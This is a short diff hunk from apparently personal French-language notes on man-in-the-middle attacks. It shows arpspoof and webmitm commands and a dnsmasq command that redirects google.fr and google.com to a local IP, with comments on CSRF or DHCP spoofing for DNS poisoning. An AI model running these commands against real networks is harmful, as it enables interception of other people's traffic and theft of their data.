@@ -62,9 +62,9 @@ arpspoof -t gw victim
 webmitm -ddd
 
 #### mitm avec DNS poisoning
-# csrf pour mettre une resolution statique www.google.fr 192.168.0.31
-
-#ou dhcp spoof -> je suis nameserver
+# e.g. csrf pour mettre une resolution statique www.google.fr 192.168.0.31
+# ou
+# dhcp spoof avec mon ip comme nameserver:
 # dnsmasq - Permet de forwarder. Permet pas de faire *.google.*
 dnsmasq -k -q -8 /tmp/dnsmasq.log -A '/google.fr/google.com/192.168.0.31'
 
